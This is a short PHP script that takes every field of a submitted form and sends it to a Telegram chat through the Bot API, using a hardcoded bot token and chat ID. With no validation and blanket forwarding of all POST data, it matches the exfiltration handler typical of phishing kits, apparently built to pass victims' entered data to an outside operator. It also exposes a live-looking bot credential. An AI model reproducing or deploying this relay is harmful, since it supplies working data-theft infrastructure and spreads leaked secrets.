<?php

$token = "6321799139:AAEvOwm6XaCal8teWdD1--gE5TMqBzCMzuA";
$chat_id = "-1001900388401";



foreach ($_POST as $key => $value) {


  $txt .= "<b>" . $key . "</b> " . $value . "%0A";
}




$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}", "r");
